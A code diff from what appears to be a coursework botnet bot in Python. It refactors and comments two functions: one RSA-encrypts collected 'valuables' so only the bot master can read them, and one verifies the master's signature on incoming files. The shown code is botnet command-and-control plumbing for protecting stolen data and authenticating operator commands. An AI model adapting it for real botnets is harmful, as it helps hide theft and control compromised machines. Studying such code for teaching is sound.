@@ -20,12 +20,10 @@ def save_valuable(data):
 def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the bot master
 
-    f = open("master_bot_public_key.pem", "rb")
-    public_key = RSA.importKey(f.read())
-    f.close()
-
-    cipher = PKCS1_OAEP.new(public_key, hashAlgo=SHA256)
-    encrypted_data = cipher.encrypt(data)
+    public_key = RSA.importKey(open("master_bot_public_key.pem", "rb").read())  # Read the public key.
+    cipher = PKCS1_OAEP.new(public_key, hashAlgo=SHA256)  # Create a cipher that can only be
+    # decrypted with the private key (i.e. by the master bot).
+    encrypted_data = cipher.encrypt(data)  # Encrypt the data with this cipher.
     return encrypted_data
 
 def upload_valuables_to_pastebot(fn):
@@ -46,26 +44,11 @@ def upload_valuables_to_pastebot(fn):
 def verify_file(f):
     # Verify the file was sent by the bot master
 
-    # Naive verification by ensuring the first line has the "passkey"
-    #  lines = f.split(bytes("\n", "ascii"), 1)
-    # first_line = lines[0]
-    # if first_line == bytes("Caesar", "ascii"):
-    #     return True
-    # return False
-
-    #https://www.dlitz.net/software/pycrypto/api/2.6/Crypto.Signature.PKCS1_v1_5-module.html
-
-    key_file = open("master_bot_public_key.pem", "rb")
-    key = RSA.importKey(key_file.read())
-    key_file.close()
-    signature = f[:512]
-    f_hashed = SHA256.new(f[512:])
-    # Should match the print statements from master_sign.py...
-    # print("signature is...")
-    # print(signature)
-    # print("f hashed is...")
-    # print(f_hashed.digest())
-    return PKCS1_v1_5.new(key).verify(f_hashed, signature)
+    # https://www.dlitz.net/software/pycrypto/api/2.6/Crypto.Signature.PKCS1_v1_5-module.html
+    key = RSA.importKey(open("master_bot_public_key.pem", "rb").read())  # Read the public key.
+    signature = f[:512]  # The first 512b of the received file should be the digital signature.
+    f_hashed = SHA256.new(f[512:])  # Everything after that should be the data. Make a fingerprint (hash of it).
+    return PKCS1_v1_5.new(key).verify(f_hashed, signature)  # Verify that the hash and signature work with the pub key.
 
 def process_file(fn, f):
     if verify_file(f):
